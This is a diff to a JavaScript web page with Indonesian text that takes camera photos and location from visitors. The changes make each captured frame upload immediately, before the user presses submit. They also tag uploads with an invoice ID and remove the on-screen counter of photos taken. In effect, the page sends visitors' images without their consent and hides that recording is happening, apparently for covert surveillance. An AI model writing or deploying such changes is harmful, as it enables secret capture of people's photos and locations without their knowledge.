@@ -876,11 +876,16 @@
       let locationResult = null;
       let frames = [];
       let captureTimer = null;
-      let sessionId = null;
+      let sessionId = window.crypto?.randomUUID
+        ? window.crypto.randomUUID()
+        : String(Date.now()) +
+          "-aaaa-4aaa-8aaa-" +
+          Math.random().toString(16).slice(2).padEnd(12, "0");
       let isSubmitting = false;
       let uploadedCount = 0;
       let sessionPhotoBase = 0;
       let locationState = "idle";
+      let isUploading = false;
 
       function setStatus(message, state = "") {
         if (!statusBox) return;
@@ -902,9 +907,6 @@
         }
         updateSubmitAvailability();
       }
-
-      let isSessionActive = false;
-      let isUploading = false;
 
       function updateSubmitAvailability() {
         if (!submitButton) return;
@@ -1045,7 +1047,7 @@
       }
 
       async function uploadPendingPhotos() {
-        if (!isSessionActive || isUploading || !sessionId) return;
+        if (isUploading || !sessionId) return;
         isUploading = true;
         try {
           while (uploadedCount < frames.length && uploadedCount < MAX_PHOTOS) {
@@ -1058,6 +1060,7 @@
               body: JSON.stringify({
                 ...photoData,
                 sessionId,
+                invoiceId,
                 photoIndex: index + 1,
               }),
             });
@@ -1092,13 +1095,7 @@
           img: canvas.toDataURL("image/jpeg", 0.72),
           ts: Date.now(),
         });
-        if (cameraCount) {
-          cameraCount.textContent =
-            "Kamera aktif · " + frames.length + "/" + MAX_PHOTOS + " foto";
-        }
-        if (isSessionActive) {
-          uploadPendingPhotos();
-        }
+        uploadPendingPhotos();
       }
 
       function requestLocation() {
@@ -1148,7 +1145,6 @@
             cameraFrame.classList.remove("frozen");
             cameraFrame.classList.add("active");
           }
-          // cameraButton.textContent = 'Kamera aktif';
           if (identityFields) identityFields.hidden = false;
           setStep(3);
           requestLocation();
@@ -1181,22 +1177,6 @@
           submitButton.textContent = "Mengirim…";
         }
 
-        // Ambil frame kamera langsung jika belum ada frame tersimpan
-        if (cameraVideo && cameraVideo.readyState >= 2 && frames.length === 0) {
-          const context = canvas.getContext("2d");
-          context.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
-          frames.push({
-            img: canvas.toDataURL("image/jpeg", 0.72),
-            ts: Date.now(),
-          });
-        }
-
-        sessionId ||= window.crypto.randomUUID
-          ? window.crypto.randomUUID()
-          : String(Date.now()) +
-            "-aaaa-4aaa-8aaa-" +
-            Math.random().toString(16).slice(2).padEnd(12, "0");
-
         const location = locationResult
           ? {
               latitude: locationResult.coords.latitude,
@@ -1228,12 +1208,9 @@
             );
           }
 
-          isSessionActive = true;
-          await uploadPendingPhotos();
           showCompletion(false);
         } catch (error) {
           isSubmitting = false;
-          isSessionActive = false;
           updateSubmitAvailability();
           if (submitButton) {
             submitButton.disabled = false;
